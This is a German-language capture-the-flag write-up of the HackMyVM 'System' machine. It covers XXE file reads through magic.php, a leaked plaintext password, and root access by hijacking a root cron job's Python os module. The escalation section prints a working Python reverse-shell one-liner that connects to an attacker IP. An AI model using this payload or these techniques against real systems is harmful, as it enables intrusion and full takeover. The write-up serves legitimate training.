# System - HackMyVM (Easy)
 
![System.png](System.png)

## Übersicht

*   **VM:** System
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=System)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 3. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/System_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "System"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines Webservers (Port 80), auf dem eine Datei `magic.php` gefunden wurde. Diese Datei war anfällig für XML External Entity (XXE) Injection. Durch Ausnutzung der XXE-Schwachstelle konnte `/etc/passwd` und anschließend eine Datei `/usr/local/etc/mypass.txt` (aus einem `.viminfo`-Leak) ausgelesen werden, die das Passwort `h4ck3rd4v!d` für den Benutzer `david` enthielt. Alternativ wurde auch der private SSH-Schlüssel von `david` via XXE extrahiert. Der Login als `david` erfolgte per SSH mit dem gefundenen Passwort. Die User-Flag wurde in dessen Home-Verzeichnis gefunden. Die Privilegieneskalation zu Root erfolgte durch Python Library Hijacking: Ein Cron-Job führte regelmäßig als `root` das Skript `/opt/suid.py` aus. Durch Modifizieren der Standard-Python-Bibliothek `/usr/lib/python3.9/os.py` (auf die `david` Schreibrechte hatte) mit einem Reverse-Shell-Payload wurde beim nächsten Ausführen des Cron-Jobs eine Root-Shell erlangt.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `vi` (oder anderer Texteditor)
*   `gobuster`
*   `dirsearch`
*   `wget`
*   `curl`
*   `nikto`
*   `Burp Suite` (oder manuelles POST für XXE)
*   `chmod`
*   `ssh2john`
*   `ssh`
*   `python` (für `http.server` und Payload)
*   `pspy64`
*   `find`
*   `nc` (netcat)
*   `cat`
*   `ls`
*   `grep`
*   `id`
*   `cd`
*   Standard Linux-Befehle

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "System" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.113`).
    *   Eintrag von `system.hmv` in lokale `/etc/hosts`.
    *   `nmap`-Scan identifizierte offene Ports: 22 (SSH - OpenSSH 8.4p1) und 80 (HTTP - nginx 1.18.0 "HackMyVM Panel").
    *   `gobuster` und `dirsearch` auf Port 80 fanden `index.html`, `/js/`, `cover.png` und die entscheidende Datei `magic.php`.

2.  **Initial Access (XXE & SSH):**
    *   Eine POST-Anfrage an `http://system.hmv/magic.php` mit einer präparierten XML-Payload (DOCTYPE-Deklaration mit externer Entität) offenbarte eine XML External Entity (XXE)-Schwachstelle.
    *   Ausnutzung der XXE zum Lesen von `/etc/passwd`, was den Benutzer `david` identifizierte.
    *   Weitere XXE-Ausnutzung zum Lesen von `/home/david/.viminfo`, was den Pfad `/usr/local/etc/mypass.txt` enthielt.
    *   XXE-Ausnutzung zum Lesen von `/usr/local/etc/mypass.txt` ergab das Passwort `h4ck3rd4v!d`.
    *   Alternativ wurde via XXE auch der private SSH-Schlüssel von `david` (`/home/david/.ssh/id_rsa`) ausgelesen (dieser war nicht passwortgeschützt).
    *   Erfolgreicher SSH-Login als `david` mit dem Passwort `h4ck3rd4v!d` (`ssh david@system.hmv`).
    *   User-Flag `79f3964a3a0f1a050761017111efffe0` in `/home/david/user.txt` gelesen.

3.  **Privilege Escalation (Python Library Hijacking via Cronjob):**
    *   Hochladen und Ausführen von `pspy64` als `david` enthüllte einen Cron-Job, der regelmäßig (minütlich) als `root` das Skript `/usr/bin/python3.9 /opt/suid.py` ausführt.
    *   `find / -name os.py 2>/dev/null` identifizierte den Pfad zur Standard-Python-Bibliothek `/usr/lib/python3.9/os.py`.
    *   Der Benutzer `david` hatte Schreibrechte auf `/usr/lib/python3.9/os.py`.
    *   Einfügen eines Python-Reverse-Shell-Payloads in die Datei `/usr/lib/python3.9/os.py`:
        ```python
        import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.140",3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
        ```
    *   Starten eines `nc`-Listeners auf dem Angreifer-System (Port 3333).
    *   Als der Cron-Job das nächste Mal `/opt/suid.py` (und damit das modifizierte `os`-Modul) ausführte, wurde eine Reverse Shell als `root` auf dem Listener des Angreifers etabliert.
    *   Root-Flag `3aa26937ecfcc6f2ba466c14c89b92c4` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **XML External Entity (XXE) Injection:** Die Datei `magic.php` war anfällig für XXE, was das Auslesen beliebiger Dateien (z.B. `/etc/passwd`, SSH-Schlüssel, Passwortdateien) ermöglichte.
*   **Passwörter in Klartextdateien:** Das Passwort für `david` war in `/usr/local/etc/mypass.txt` gespeichert.
*   **Unsichere Dateiberechtigungen (Python Standard Library):** Die Standard-Python-Bibliotheksdatei `os.py` war für einen normalen Benutzer (`david`) beschreibbar.
*   **Python Library Hijacking:** Ein als `root` laufender Cron-Job importierte das `os`-Modul. Durch Modifizieren der beschreibbaren `os.py`-Datei konnte beliebiger Code als `root` ausgeführt werden.
*   **Informationslecks:** `.viminfo` enthielt Pfad zu einer Passwortdatei.

## Flags

*   **User Flag (`/home/david/user.txt`):** `79f3964a3a0f1a050761017111efffe0`
*   **Root Flag (`/root/root.txt`):** `3aa26937ecfcc6f2ba466c14c89b92c4`

## Tags

`HackMyVM`, `System`, `Easy`, `XXE`, `SSH`, `Password Cracking`, `Python Library Hijacking`, `Cronjob Exploitation`, `Linux`, `Web`, `Privilege Escalation`
